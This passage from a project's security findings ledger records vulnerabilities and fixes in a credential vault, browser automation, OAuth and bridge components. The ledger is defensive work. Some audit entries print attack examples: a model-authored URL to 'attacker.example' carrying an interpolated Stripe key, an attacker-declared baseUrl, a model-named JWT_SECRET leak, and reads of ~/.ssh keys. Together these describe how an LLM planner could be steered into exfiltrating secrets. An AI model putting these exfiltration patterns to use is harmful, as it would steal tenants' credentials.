  `mock.calls[0][0]` on a zero-arg `vi.fn`, whose recorded tuple type is `[]` — the `as {...}` cast
  was papering over an argument the mock's type said could not exist. All fixed; `npm run
  typecheck` is green across the three workspaces and `npm test` is 130 shared / 2555 api / 359 web.
- **`shared-suite-counted-twice`** (FIXED 2026-07-28, MEDIUM, test-integrity — found while
  verifying the `ci-typecheck-never-ran` fix). The `shared` suite collected every test TWICE — once
  from `src/`, once from the compiled `dist/` copy — so its reported size was a function of a BUILD
  ARTIFACT, not of the tests. Observed in one sitting: **5 files/130 tests** on a stale dist,
  **6/144** after a rebuild, **3/72** on a clean checkout. The true count is 3 files / 72 tests, so
  every "shared 130" in the recent commit messages was inflated by a factor of ~1.8 and the number
  moved whenever someone happened to build. Two causes, both fixed: `shared/tsconfig.json` compiled
  `src/**/*.test.ts` into the published `dist/` (tests were shipped to consumers as well as
  double-collected) — now excluded; and `shared` had no vitest config, while **Vitest 4 narrowed
  its default `exclude` to `node_modules` and `.git` only**, dropping the dist glob that older
  versions excluded — now `shared/vitest.config.ts` pins `include: src/**/*.test.ts` and restores
  the dist exclusion. `api/` and `web/` were never affected: their builds emit no test files.
  Verified stable at 3/72 across a clean build, a rebuild and a full-lane run. Worth noting for
  anyone auditing the ledger: a census that quotes counts is only as trustworthy as the collection
  behind it, and this one silently changed under a minor-version default.
- **`k4-migration-dead-on-arrival`** (FIXED 2026-07-29, MEDIUM, correctness/governance — found by
  the A-8 typecheck sweep). `api/scripts/migrate/ciphertext-v2.ts` is journaled as landed (commit
  `f993d06`, `docs/decisions.md` 2026-07-28 K-4) but **had never compiled and has never run**. It
  imported `cofreItems` from `src/data/stores.js`, which does not export it — the Cofre item store
  lives in `src/cofre/store.ts`, which exports `__cofreItemsStoreForMigration` for exactly this
  caller. FIXED here only to the extent the red baseline demanded: the import is corrected and the
  file now typechecks. Still OPEN, and this is the part that matters — the migration is **not
  wired and not proven**: (a) nothing registers it in `api/scripts/migrate/cli.ts`, so there is no
  way to invoke it; (b) the `gate:crypto-version` script the decision entry names does not exist in
  `package.json`; (c) it has no test, so `module_tests` never covered it. The consequence is that
  the v1 weakness the entry claims K-4 removes — a v1 row is under the flat global key and decrypts
  under ANY tenant argument — is still fully present in any deployed database, and the journal says
  otherwise. Close by wiring the CLI entry, adding the gate script, and adding a hermetic test that
  seeds v1 rows, migrates, and asserts `noV1CiphertextRemains()`. Note while doing so that
  `noV1CiphertextRemains()` currently CALLS `migrateCiphertextToV2()`, so the "check" mutates the
  database — safe because the migration is idempotent, but a gate that writes is the wrong shape
  and should be split into a read-only scan. **CLOSED 2026-07-29**: scan and migrate are now
  separate (`scanCiphertextVersions()` is read-only, so the post-cutover gate can be pointed at
  production to ask a question); `api/scripts/migrate/ciphertext-v2-cli.ts` is the entry point,
  dry-run by default with `--execute` required to write (ch10 §10.3 rule 3); `migrate:ciphertext-v2`
  and `gate:crypto-version` are wired in `api/package.json`, the latter exiting non-zero while any
  v1 row remains so it can gate CI after the cutover window. Proven by
  `api/tests/security/ciphertext-v2-migration.test.ts` (9 cases, both plants red) AND by driving the
  real CLI against an ephemeral mongo: gate exit 1 with a seeded v1 row -> `--execute` reports
  COMPLETE -> gate exit 0. The decisive test is not "the row changed shape" but "the row can no
  longer be decrypted under the WRONG tenant", which is the property K-1 only gave to new writes.
- **`cofre-raw-store-lint-rule-missing`** (FIXED 2026-07-29, LOW, defence-in-depth — found by the
  A-8 sweep). Plan item B-1 specified "an eslint rule forbidding any import of the raw `cofre_items`
  store handle outside `api/src/cofre/`, and forbidding re-derivation of the scoping predicate".
  No such rule exists in `.eslintrc.cjs` — the module-direction zone array lists `./api/src/cofre`
  only as a TARGET that may not import `routes/`/`server.ts`. So the scoped-repository chokepoint
  that makes the Cofre the third `OwnerVisibilityScoped` consumer rests on convention alone, and
  `__cofreItemsStoreForMigration` (a deliberately ugly name, now imported by the migration script)
  is greppable but not enforced. Not exploitable today — the only importer is the migration — but
  the whole point of B-1's chokepoint is that it cannot be bypassed by a future caller who has not
  read the plan. FIXED: `.eslintrc.cjs` bans `**/cofre/store` outside `api/src/cofre/**`, with
  `api/scripts/migrate/**` legitimately outside the rule's file set (a migration rewrites every
  tenant's rows and so cannot go through an owner-scoped repository). Worth recording HOW it was
  nearly got wrong: the first attempt added a second `no-restricted-imports` override for
  `api/src/**`, and because ESLint REPLACES rather than merges that rule per file, it silently wiped
  the `@anthropic-ai` egress ban (FIXED-3/8/13) for every non-llm file while appearing to add a
  rule — a lint config that looked stricter and was materially weaker. Both bans now live in one
  override per file set, and the llm/ and cofre/ exemptions RESTATE the ban they keep instead of
  switching the rule off. All four directions verified against planted imports.
- **`page-values-to-log-and-memory`** (FIXED 2026-07-27, HIGH, confidentiality — Cofre discovery
  gate R-4 + R-5). Two leaks of the same class: values read off a LIVE PAGE of an authenticated
  session. (R-4) `automation/engine.ts` merged verifier-extracted values into the shared `inputs`
  map and logged them with `console.log(\`... ${k}="${v}" ...\`)` — cleartext in the process log,
  and from `inputs` they are template-substituted into downstream `api_call` URLs/headers/bodies
  whose RESOLVED form is persisted. FIXED: the log records the key and the LENGTH only, and a
  secret-shaped KEY NAME (otp/token/password/senha/sessao/credential/pin/cvv, PT-PT included) is
  refused outright so the value never joins `inputs` at all. The vocabulary is pinned in BOTH
  directions — a false positive silently refuses an ordinary input, and a bare `/auth/` matched
  `author`. (R-5) `automation/cache.ts` wrote the resolved action into ORGANIZATIONAL MEMORY at
  tier `active` through the ordinary `createMemory` surface, and `memory/resolver.ts` `isInjectable`
  excluded only `tier==='archive'` — so those rows were term-scored against the user's ordinary
  chat prompt and injected under `# Memória`. `summariseAction` put the first 40 chars of any
  `fill`, the FULL `navigate` URL and the FULL `select` value into the scored `content`, so a
  magic-link or SSO-callback URL was replayed verbatim to the chat model on term overlap. FIXED by
  a `nonMemorable` memory class that `isInjectable` now requires to be absent (structurally "not a
  memory", distinct from `tier:'archive'` which is merely user-hidden), set on every action- and
  assertion-cache row; plus de-valuing the summaries at the source — length for a `fill`, origin +
  pathname for a `navigate` (the query string is where the tokens live), no literal for a `select`
  or an assertion. The cache still works: the exact action lives structurally in `cachePayload`,
  which was never term-scored. Pinned by `api/tests/security/page-value-leaks.test.ts` (44 cases).
- **`screenshot-plane-unauthenticated`** (FIXED 2026-07-27, HIGH, confidentiality + GDPR — Cofre
  discovery gate R-3). `/automation-screenshots` was an `express.static` mount over
  `<dataDir>/automation-runs` with NO auth middleware, NO tenant check and NO expiry. The recorded
  rationale (`docs/decisions.md`, 2026-07-11) was that an `<img>` cannot carry an Authorization
  header, so "the unguessable automationId/runId path IS the capability". Two problems: the PNGs
  are screenshots of an AUTHENTICATED session on a client portal (for this product, processo
  numbers and client NIFs rendered as pixels), and the run id is not treated as a secret anywhere
  else — it travels in SSE frames, persisted step records, the run API and logs. FIXED without
  trading the control away, using the pattern the repo already applies to the SSE stream for the
  identical constraint: a short-lived platform JWT in the query string (`verifySseToken`), then a
  run lookup that checks org and ownership before a byte is streamed. Cross-tenant reads answer
  404, not 403, so existence is not an oracle; an unattributable legacy run (no `orgId`) is refused
  rather than served; path segments go through the containment resolver; non-PNG files are refused.
  The URL SHAPE is unchanged, so every persisted `screenshotUrl` keeps resolving — the web client
  appends `?token=` via the existing `withPreviewToken` helper. RETENTION: nothing ever deleted
  these PNGs (every reference in `api/src` was a write or a path builder), a GDPR erasure gap over
  an unindexed tree, so a 7-day sweeper and a `deleteRunScreenshots` erasure path land in the same
  change. Pinned by `api/tests/security/screenshot-plane.test.ts` (14 cases, including a
  traversal-escape test on the erasure path) and a REWRITTEN
  `api/tests/contract/automation-screenshots.test.ts`, which previously asserted the unauthenticated
  read as the contract.
- **`d8-oauth-custody-plane`** (AUDIT COMPLETE 2026-07-27 — the audit no discovery-gate pass
  covered). The live OAuth credential-custody plane holds refresh tokens TODAY and had received no
  verdict from any of D1-D7. Audited: `integrations/platform-oauth.ts`, `m365-proxy.ts`,
  `prefetch.ts`, `app-sso-sessions.ts`, `pipedream.ts`.

  **CONFORMS, and should be reused rather than replaced.** `platform-oauth.ts` encrypts the token
  bundle at rest through the one crypto module, refreshes on expiry and re-persists, and — the part
  worth calling out — uses a SINGLEFLIGHT per row so a rotating `refresh_token` can never be
  double-spent by a lazy refresh racing a sweep. That is a genuinely hard property and it is already
  correct. External I/O defaults to the SSRF-guarded fetcher. `connect` logs `{provider}` only.
  `m365-proxy.ts` is the CLOSEST SHIPPED ANALOGUE OF THE I9 PRIMITIVE: it forwards the Graph path
  verbatim while injecting a freshly-refreshed Bearer server-side, so the served artifact never sees
  the token — exactly the "caller names a reference, a fixed primitive executes" shape the Cofre
  needs, and WS-J should model on it. `pipedream.ts` keeps project keys in one org-scoped encrypted
  row, decrypted just-in-time and never logged/thrown/returned, behind a master toggle and a billing
  gate. `app-sso-sessions.ts` enforces artifact isolation server-side (`session.appId === canonical
  id`, never by cookie path) and its pending-auth consume is atomic (`findOneAndDelete`), so the
  no-replay property is LOCAL rather than relying on the IdP.

  **DIVERGES — the gaps that matter for the Cofre.** (1) The whole plane is a PARALLEL custody
  path: it never routes through `cofre/unwrap()`, so none of it has a grant, a lock, per-item origin
  binding, or an "item used" Registo event. A user cannot see or revoke these credentials from the
  Cofre, and "Bloquear tudo" does not touch them. (2) It uses the UNSCOPED `encrypt()`, so ciphertext
  is not org-bound — the same finding already recorded against integration credentials, under the
  same single global `ENCRYPTION_KEY`. (3) `prefetch.ts` injects OAuth-fetched email/calendar/file
  CONTENT into the chat SYSTEM PROMPT (`agents/context.ts:170`), cached per org for 60s. That is
  model-bound text and therefore IS covered by the anonymisation chokepoint (`client.ts:967-968`
  anonymises `systemPrompt` as well as `prompt`) — so I1 holds, with the honest residual that the
  coverage is only as good as the deny-list and the PT recognizers. Worth stating explicitly because
  the gate never verdicted it and a reader could reasonably have assumed otherwise.

  **CONSEQUENCE FOR B-4.** The migration should bring these rows under `unwrap()` — gaining grants,
  lock-now/lock-all and the Registo events — WITHOUT rewriting the refresh machinery, whose
  singleflight is the part that is hard to get right. `oauth_token` is already a Cofre item type.
- **`canvas-token-is-a-platform-token`** (FIXED 2026-07-27, HIGH, authentication — Cofre F-1, the
  `api/src/streaming/` security pass). The canvas (screencast) token is signed with the SAME secret
  as platform session tokens and carried NO class marker: `sub` + `jti`, no `aud`. `auth/jwt.ts`'s
  token-class guard only knew about `ekoa-bridge`, so `verifyToken` ACCEPTED a canvas token and
  returned claims with a valid `sub`/`jti` and `role`/`orgId` undefined. `requireAuth` then passed
  it end-to-end: the jti exists, it is not revoked, `getActivation(sub)` resolves for a real user,
  and `iat` is fresh. VERIFIED EMPIRICALLY with a throwaway probe before being written up, not
  inferred from a read. The consequence is not theoretical — every route that authorizes on
  `req.user.sub` ALONE never reads `role` or `orgId`, so a leaked 600-second canvas token was a
  platform bearer token for gateway-key MINT (which returns a long-lived API key), the bridge token
  endpoint, and the Cofre item routes. FIXED with the same mechanism the bridge token already used:
  `aud: 'ekoa-canvas'` minted and required on the media channel, and refused by the platform
  verifier. The guard checks `traceId` as well as `aud`, so a token minted before the audience
  landed gets no grandfathered window. Pinned by `api/tests/security/canvas-token-class.test.ts`
  (8 cases, including a validly-signed pre-audience token that exercises the traceId branch rather
  than merely failing a signature check).
- **`streaming-screencast-has-no-credential-suppression`** (OPEN, HIGH, confidentiality — Cofre F-1;
  BLOCKS F-2 and D-5). The CDP screencast in `api/src/streaming/session.ts` is a continuous JPEG
  stream of the LIVE page, and it is a SEPARATE path from the automation screenshot that H-2/H-3
  masks. `Page.startScreencast` has no mask option — Playwright's `mask` is a `screenshot()` feature
  only — so masking is not available here and SUPPRESSION is the only correct control: the
  screencast must be stopped for the duration of a typist credential window, and the typist must
  refuse to run at all if it cannot confirm the screencast is stopped. Until that lands, WS-F's
  typist must not fill a credential while a canvas session is attached. This is the specific reason
  the plan blocks F-2 on F-1, and it is now a named finding rather than a scheduling note.
- **`browser-context-leak-and-docblock-drift`** (FIXED 2026-07-27, MEDIUM, resource + accuracy —
  Cofre discovery gate G-3). `LocalBrowserSession.dispose()` closed only the PAGE, so every run
  leaked its browser context — and with it the entire cookie jar of an authenticated session — for
  the lifetime of the process. FIXED by retaining the context and closing it in `dispose()`, both
  closes best-effort so teardown never fails a completed run. SEPARATELY, the module's docblock and
  `ensurePage`'s comment described "the owner's PERSISTENT context" with concurrent runs for one
  owner sharing cookies; the composition root has always handed back `browser.newContext()`,
  ignoring the owner entirely. The divergence is safe in the direction that matters — a fresh
  isolated context per session means no cookie jar is reused across runs OR owners, which is
  stricter than the documented model — but reading the docblock instead of the composition root
  produced wrong conclusions twice during the discovery gate. The comments now describe the code as
  built, and the behaviour is pinned by test rather than asserted by comment. Pinned by
  `api/tests/security/browser-context-lifecycle.test.ts` (5 cases).
- **`planner-and-assertion-echo-page-content`** (FIXED 2026-07-27, MEDIUM, confidentiality — Cofre
  discovery gate H-6 + the H-1 assertion leg). Two messages carried content into three destinations
  each: the process log, the RETRY PROMPT sent back to the model, and the persisted record / SSE
  stream rendered to the user. (H-6) `automation/planner.ts` built a 50-character preview of an
  auth-shaped header's VALUE and interpolated it into a cross-validation violation — and the thing
  being reported is by definition a literal credential the model just wrote, so the check designed
  to stop raw tokens in headers was itself copying them into all three sinks. The sibling argv check
  echoed the whole offending argv element. Both now report a CATEGORY: the header NAME, or the argv
  POSITION. (H-1 assertion leg) `automation/executor.ts` `expect_text` echoed 200 raw characters of
  `innerText` from a page of an AUTHENTICATED session, `expect_url` echoed the full URL including
  the query string where magic-link tokens and SSO codes live, and `expect_title` echoed the title
  whole. These are the ONE live in-process DOM-text path the gate identified as reaching the
  rehearsal fixer's prompt. Now: the expectation plus a character COUNT, origin + pathname, and a
  bounded title. Pinned in `api/tests/security/credential-boundaries.test.ts`.
  NOT YET DONE, and explicitly still open: the rest of H-1 — `local_command` stdout/stderr,
  `ekoa_action` results and `extractActionRunOutput` still need the run-scoped `SecretRegistry`
  threaded through the engine, which is a structural change rather than a message fix.
- **`anonymisation-skips-the-pixel-plane`** (FIXED 2026-07-27, HIGH, confidentiality — Cofre
  discovery gate H-2). `api/src/llm/client.ts` anonymises `prompt` and `systemPrompt` at the egress
  chokepoint (`:967-968`) and forwards `images: opts.images` VERBATIM (`:981`) — and
  `api/tests/llm/client.test.ts` PINNED that forwarding as the contract, so the gap read as
  intended behaviour. `docs/security.md` described the pipeline as covering "all model-bound text",
  which is true and false-by-omission at once: a reader took it as covering everything model-bound.
  For this product the pixels are screenshots of an AUTHENTICATED session on a court portal —
  processo numbers, client NIFs, and during a login step the credential itself. FIXED BROWSER-SIDE,
  because a Cortex-side transform on a finished PNG is OCR-and-hope: `automation/screenshot-masking.ts`
  masks credential-bearing regions by LOCATOR at capture time (so the sensitive pixels are never
  rendered into the buffer) with a SOLID mask colour, and `LocalBrowserSession` gains
  `withCaptureSuppressed()` so a credential window takes NO picture at all — a stronger guarantee
  than masking the field. The failure mode is the decisive property: a masking failure returns null,
  which the existing capture path already treats as "no screenshot this step", so it can never
  degrade to an unmasked capture. The pinning test is re-framed in place as plumbing-only and
  `docs/security.md` now states the text/pixel split, including the RESIDUAL: a screenshot still
  carries non-credential page content as untokenized pixels. Pinned by
  `api/tests/security/screenshot-masking.test.ts` (12 cases).
- **`envwhitelist-reads-cortex-env`** (FIXED 2026-07-27, HIGH, confidentiality — Cofre discovery
  gate D4/J-4). `LocalCommandSpec.envWhitelist` was a list of environment variable NAMES accepted
  from the planner (a model) which `buildEnv` resolved against the CORTEX API SERVER's OWN
  `process.env` — provider keys, `ENCRYPTION_KEY`, `JWT_SECRET`, database credentials — and shipped
  the resolved values to a user's machine. A model-authored `envWhitelist: ["JWT_SECRET"]` was a
  complete platform compromise expressed as an ordinary step field. It never had a receiver
  (`ekoa-bridge`'s bash tool hard-scrubs the child to seven names) and `local_command` is unreachable
  end-to-end, so it was latent rather than live — but it would have gone live the moment
  `setDaemonConnectionResolver` was wired. DELETED rather than hardened, in the same change that
  adds the real primitive (`api/src/cofre/process-injection.ts`), because deletion cost nothing then
  and becomes impossible later. Pinned by `api/tests/security/i9-env-injection.test.ts` (29 cases),
  which includes a STATIC GUARD asserting the declaration and both use sites are gone.
- **`cofre-absent`** (IN PROGRESS 2026-07-27, the Cofre build itself — Cofre WS-A/WS-B/WS-C). The
  discovery gate found NO Cofre: no credential item model, no grants, no policy-lock seam, no origin
  binding as a property of a credential, no relay typing, no session store. LANDED SO FAR: the
  `shared/src/cofre.ts` vocabulary with I7 and I8 encoded as SCHEMA (a `certificate_identity` cannot
  hold a TTL grant; a signature relay cannot be constructed without a document name + hash), and
  `api/src/cofre/` with the single `unwrap()` seam — fail-closed on tenancy, an active grant, origin
  binding and existence, all checked before anything decrypts. Owner-scoped, ciphertext-only at rest,
  lock-now / lock-all, and an item view with no value field. Pinned by
  `api/tests/security/cofre-policy-lock.test.ts` (28) and `shared/src/cofre.test.ts` (28).
  STILL OPEN, in plan order: the routes and the product surfaces (WS-D, which must EXTEND the shipped
  `/settings/privacy` grants+ledger area rather than create a parallel one), the typist (WS-F, blocked
  on the `api/src/streaming/` security pass F-1), session-first storage (WS-G), the redaction pipeline's
  remaining legs (WS-H, incl. the image-plane bypass at `llm/client.ts:981` that a TEST currently pins),
  egress selection (WS-I), bridge protocol v2 + the I9 primitive (WS-J), and the KMS envelope (WS-K).
  A D8 audit of the live OAuth credential-custody plane is owed BEFORE the item model is considered
  fixed — `platform-oauth.ts`, `m365-proxy.ts`, `prefetch.ts`, `app-sso-sessions.ts` and
  `pipedream.ts` hold refresh tokens today and no audit issued a verdict on any of them.
- **`bridge-jwt-key-monoculture`** (FIXED 2026-07-27, HIGH, confidentiality — Cofre discovery gate
  R-8). `api/src/bridge/signing.ts` keyed the DelegatedTask HMAC with `loadConfig().jwtSecret` — the
  platform-wide secret that signs every user's session token — while `ekoa-bridge` stores
  `signingSecret` in a plaintext `config.json` (0600) on every paired laptop. Making delegation WORK
  therefore required placing the key behind every session in the deployment on every user's machine,
  so one compromised laptop compromised every session. Worse, NOTHING on the daemon side ever WROTE
  `signingSecret` (`pair.ts:72` only carried an existing value forward; `serve.ts:84` fell back to
  `''`), so in practice the delegated path was unusable without an operator hand-copying
  `JWT_SECRET` — the daemon's verifier refuses an empty key, so it denied every task: fail-closed,
  but for an invisible reason. FIXED by minting a PER-PAIRING secret in `registerPairing`, encrypted
  at rest, preserved across a redial (rotating would silently break a daemon holding the old one)
  and delivered to the owner on the already-authenticated `/bridge/token` exchange. `signDelegatedTask`
  / `verifyDelegatedTaskSig` take the secret as a parameter and refuse an empty one loudly — which
  also CONVERGES this signer with `ekoa-bridge/src/wire/signing.ts`, whose vendored copy parameterised
  the secret and added that guard back in 2026-07-10. A pairing with no secret is REFUSED (`denied`),
  never a fallback. Pinned by `api/tests/security/bridge-key-split.test.ts` (11 cases).
- **`bridge-revoke-unreachable`** (FIXED 2026-07-27, MEDIUM, availability of the kill switch — Cofre
  discovery gate R-9). `revokePairing` (`api/src/bridge/registry.ts:203`) implements terminal
  revocation with a tombstone that survives a redial and closes the live socket — and had NO
  production caller. It was reachable only from `api/tests/*`; the daemon's own `unpair` is
  local-only. A compromised machine could not be cut off except by deactivating the whole account.
  FIXED by mounting `DELETE /api/v1/bridge/pairings/:pairingId` (owner or org-admin — a compromised
  machine is exactly when the org's admin may need to act without the owner), answering 404 rather
  than 403 outside the caller's scope so the route is not an existence oracle, and emitting a
  metadata-only `security::bridge_pairing_revoked` Registo row.
- **`bridge-delegation-org-adopted`** (FIXED 2026-07-27, MEDIUM, tenant isolation — Cofre discovery
  gate E-1). `delegateToLocal` called `getConn(actor.userId)` with NO `expectedOrg`, and
  `DelegationActor` had no `orgId` field, so the task's org was ADOPTED from whatever connection
  resolved rather than checked. Org binding was structural on the connect and provider paths and
  adopted-not-checked on the one dispatch path that mints a SIGNED task. FIXED by carrying `orgId`
  on `DelegationActor` (bound from the run's actor, never a request body) and passing it as
  `expectedOrg`, so a pairing in another org reads as no pairing.
- **`bridge-excerpts-no-denylist`** (FIXED 2026-07-27 in `ekoa-bridge`, MEDIUM, confidentiality —
  Cofre discovery gate H-7). `ekoa-bridge/src/containment/resolver.ts` enforced only that the
  realpath stays inside a granted root. Containment answers "may the daemon touch this location";
  it cannot answer "should these BYTES cross Boundary 1", and they do — `engine.ts` `compose()`
  concatenates file excerpts verbatim into the provider_request body (its own comment: "The
  excerpts cross Boundary 1 here"). A user who granted a project directory containing `.env` or
  `.ssh/` had not consented to shipping their keys to a model. FIXED with a credential-bearing
  denylist applied to the REAL path, kept byte-identical to
  `api/src/security/path-containment.ts`; the two copies should be shared through the release
  artifact rather than by hand. Defence in depth only — containment remains the control.
- **`bridge-ledger-records-secrets`** (FIXED 2026-07-27 in `ekoa-bridge`, MEDIUM, confidentiality —
  Cofre discovery gate H-5). `AutomationLedgerRow.detail` was "the full bash command line, or the
  browser navigation target — recorded in full" per ADR-002, on an append-only, fsynced ledger that
  is forwarded to Cortex as trust-chip metadata. A secret passed as an argv literal
  (`curl -H "Authorization: Bearer …"`) or a one-time code in a URL was written to disk in
  cleartext, permanently, on the user's own machine — by the same component that must hold
  delivered secrets RAM-only. The audit requirement is "which invocation happened, and can I
  correlate two of them", not "what were the argument values", so rows now carry a SHAPE (program
  name + argument count, or origin+pathname) plus `detailHash`, a stable non-reversible correlation
  id. `detailHash` is optional in the schema so pre-H-5 ledger lines still parse instead of reading
  as corrupt. Two existing tier2 assertions pinned the verbatim detail and were updated.
- **`credential-origin-unbound`** (FIXED 2026-07-27, CRITICAL, confidentiality — Cofre discovery
  gate R-2). Credential use had NO origin binding on either HTTP path, and the path where the MODEL
  authored the destination had the WEAKER egress control. `automation/executors/api-call.ts`
  interpolated the decrypted fields of a model-supplied `authIntegrationKey` into a model-supplied
  URL behind only `guardedFetch`'s SSRF check — which by design permits every PUBLIC host — so
  `url: "https://attacker.example/?k={{integration.stripe.api_key}}"` exfiltrated a live tenant
  secret in one hop, and `rehearsal.ts` let the mid-run fixer author both fields.
  `integrations/action-executor.ts` was worse: a bare `globalThis.fetch` behind a `^https?://`
  shape check on a baseUrl written verbatim from an LLM-authored package config, with no SSRF guard
  at all. FIXED by `api/src/security/origin-binding.ts`: `credentialedFetch` /
  `assertOriginAllowed` make `allowedOrigins` a REQUIRED option and refuse an empty list, so
  "we could not determine the binding" and "any host is fine" can never share a code path. Matching
  is exact-host or parent-domain, never a suffix string (`evil-stripe.com` does not satisfy a
  binding to `stripe.com`). The api_call executor checks AFTER interpolation and BEFORE the
  request, so a refused destination never sees the credential; the refusal does not echo the
  attacker-chosen URL into the persisted record. The interim binding is derived from the
  integration's own declared base URLs via a fail-closed seam
  (`setIntegrationOriginResolver`); Cofre per-item `boundOrigins` replaces the derivation in WS-C
  without moving the enforcement point. `action-executor.ts` now also goes through `guardedFetch`.
  Pinned by `api/tests/security/origin-binding.test.ts` (20 cases) and
  `api/tests/security/api-call-origin-binding.test.ts` (8 cases through the real executor).
- **`integration-package-baseurl-unreviewed`** (OPEN, HIGH, confidentiality — raised while fixing
  R-2). A user-defined integration package's `httpConfig.baseUrl` is written VERBATIM from an
  LLM-authored `config.json` (`routes/integration-builder.ts:210` →
  `integrations/definitions.ts` `writeRuntimePackage`), and the owner's decrypted credential is
  injected into requests against it. R-2 put that path behind the SSRF guard, which stops it
  reaching internal infrastructure, but origin binding CANNOT fix it: the allowlist for a package
  is derived from the package's own declared host, so binding it to itself is tautological. A
  package that declares `baseUrl: https://attacker.example` is therefore still able to receive the
  credential it is configured with. This is a PROVENANCE problem — the fix is an approval gate on
  the declared host when a package is created or edited (and, later, the Cofre grant ceremony
  naming the host the user is consenting to). Deliberately not closed inside R-2 because it needs a
  user-facing approval surface, not a filter.
  NARROWED (not closed) 2026-08-03 by slice D3. `achieve`'s author arm can no longer be the way a
  new host enters the allow-list: the credential's egress binding is resolved BEFORE the draft
  exists and the draft's host must already be inside it, so on the declared-origin branch the
  allowed set is a PRE-IMAGE that cannot grow to fit (`authored-action.ts` check 5, plus check 8
  re-asserting it against the interpolated URL; the security suite measures the granted origins
  before and after a successful author and asserts they are identical). What remains OPEN is
  exactly what this entry names: the BUILDER SAVE path. A human at `PUT /api/v1/integration-builder/package`
  can still declare any `baseUrl` they like, because that route requires a human session and the
  fix is still an approval ceremony on the declared host, not a filter. So D3 closes the
  key-reachable half and changes nothing about the human half.
- **`ekoa-action-unsandboxed-fs`** (FIXED 2026-07-27, CRITICAL, confidentiality + integrity — Cofre
  discovery gate R-1). `resolveUserPath` in `api/src/automation/platform-primitives.ts` applied no
  containment whatsoever — `if (isAbsolute(path)) return path;`, with the comment "trust user-issued
  paths via Ekoa actions, since manifests are authored by the coding agent under our control". That
  premise is false in both directions: the recipe is MODEL-authored (I5) and `rehearsal.ts` lets the
  mid-run fixer LLM choose which capability runs. `file.read` of any absolute path put the bytes in
  `ctx.captured`, which is persisted as `capturedValues` and returned by `extractActionRunOutput`
  into the calling agent's tool result (I1/I2/I4); `file.write` was equally unrestricted. Because
  `ekoa_action` executes CLOUD-side with no daemon dependency, this ran on the API host today.
  FIXED by `api/src/security/path-containment.ts` — a copy-with-review of the daemon's ADR-001
  resolver (real-path checked, symlink-escape proof, write-safe for not-yet-created leaves) — rooted
  at a per-owner `<dataDir>/action-workspace/<orgId>/<userId>`, plus a credential-bearing denylist
  applied to the REAL path so a benign label cannot launder `~/.ssh/id_rsa`. `~` now means the
  workspace root, not the host home directory. An absolute host path is REFUSED rather than
  silently reinterpreted as root-relative (that reinterpretation was a first-cut defect of this fix,
  caught by its own test: it turned a containment breach into a confusing ENOENT).
  Pinned by `api/tests/security/action-path-containment.test.ts` (32 cases) and
  `api/tests/security/action-file-primitives.test.ts` (11 cases, through `executeRecipe`).
- **`redaction-masker-leak`** (FIXED 2026-07-27, HIGH, confidentiality — Cofre discovery gate R-6).
  Two divergent private copies of the value-keyed masker existed, each leaking in a different way,
  and BOTH silently skipped any secret shorter than four characters — the failure mode a masker must
  never have, because a value that is quietly not masked reads exactly like one that was.
  `integrations/http-template.ts`'s `maskValue` emitted `***…1234`, a persisted plaintext SUFFIX of
  every credential the platform ever proxied; `automation/executors/api-call.ts` masked to
  `<redacted>` with no leak but matched only the RAW literal, so a URL-encoded, base64 or
  JSON-escaped occurrence walked straight into the persisted step record. FIXED by
  `api/src/security/redaction.ts`: a run-scoped `SecretRegistry` substituting `[REDACTED:<handle>]`
  (no plaintext fragment, no length hint) across raw / URL-encoded / base64 / base64url /
  JSON-escaped forms, longest-value-first, case-folded above 8 chars. Both copies are now thin
  callers. Sub-3-char values are still not substituted — doing so would destroy the surrounding
  stream — but they are surfaced on `registry.unmaskable` instead of being dropped in silence.
  Pinned by `api/tests/security/redaction.test.ts` (24 cases, one per regression).
- **`citius-listener-blocked`** (OPEN, MEDIUM, correctness — 2A-S4 review). `citius` is the one
  SHIPPED user-defined listener source that is not deferred for a missing transport, and it still
  cannot poll. 2A-S4 fixed the part that belonged to the listener rail (the composition root now
  injects the automation seam into the executor the supervisor uses, guarded by a static test, and
  the poll unwraps the automation run envelope so the package's `listenerConfig` paths resolve
  against the action's own output). TWO blockers remain, neither of them the rail's and neither
  silent — the listener fails loudly on every tick with the exact reason on its failure counter:
  (1) `automationBinding.automationId` is the template placeholder `citius-<template>-template`,
  which no lookup resolves; ekoa-dev rewrote that id to the per-owner provisioned id inside the
  USER SANDBOX COPY of the package (integration-storage.ts), and ekoa-code deliberately descoped
  per-user sandbox packages, so the shipped binding never matches the org's provisioned automation
  (`managedAutomationId(orgId, key, templateKey)` — SINCE C1 (run 20260801-171149) this is 3-arg
  and returns `sha256(JSON.stringify([orgId, key, templateKey]))`; the 2-arg `citius-<template>`
  form recorded here no longer exists, and any remediation must resolve the id per-org or follow
  the `source.{integrationKey,templateKey}` provenance instead of hardcoding a literal). The failure surfaces as
  `unknown_automation: citius-notificacoes-template`. This equally breaks the automation
  `integration` step, i.e. it is NOT specific to the listener rail; two committed assertions
  currently pin the placeholder value (`api/tests/contract/integration-definitions.test.ts`,
  `api/tests/e2e/citius-integration.e2e.mjs`), so the fix (resolve the bound id via the
  deterministic managed id, or re-point the shipped package and both assertions) is a deliberate
  separate change. (2) The CITIUS captured browser session does not exist yet — `session-capture.ts`
  is track 2A slice 6 — so even a resolvable automation cannot authenticate to the Portal dos
  Mandatários. Close with 2A-S6 plus the id fix.
- **`event-array-field-shape-drift`** (OPEN, LOW, correctness — 2A-S4 review note). Both poll
  sources treat a non-array `eventArrayField` as an empty batch (`asArray` returns `[]`), so a
  provider that changes the shape of that field advances the cursor over items that were never
  read. Identical in `platform-poll.ts` (approved at 2A-S1) and in ekoa-dev, so it is recorded here
  rather than changed inside a slice: the honest fix is to distinguish "absent/array" (a real empty
  batch) from "present but not an array" (a shape change ⇒ stall the cursor and report it).

- **`insolvencia-watch-at-least-once`** (OPEN, LOW, quality — run 20260717-190134 E4). The Citius
  insolvência polling watcher persists a seen-ref after each durable watch.hit emit, but the
  emit-then-persist is at-least-once not atomic: if `updateWatch` itself fails after the event
  write, that one publication can re-emit a duplicate dossiê timeline entry on the next poll (never
  data loss, never cross-org). The seenRefs cap (500 newest) likewise assumes the portal's active
  window stays under the cap. Both are documented v1 limits (fixture-driven; the real-portal use is
  the attended signed-in-connector follow-up run per BRIEF §8 run-2 note); a windowed cursor +
  idempotent event write is the follow-up hardening.

- **`builder-raw-view-wider-than-the-save-path`** (FIXED 2026-08-03, HIGH, credential disclosure
  (intra-tenant) — found by the D2 fresh-context re-review probing 37 scenarios over real HTTP, not
  by a test failing). D2's round-trip fix (`editablePackageFor`,
  `api/src/routes/integration-builder.ts`) gated the RAW, byte-exact package on
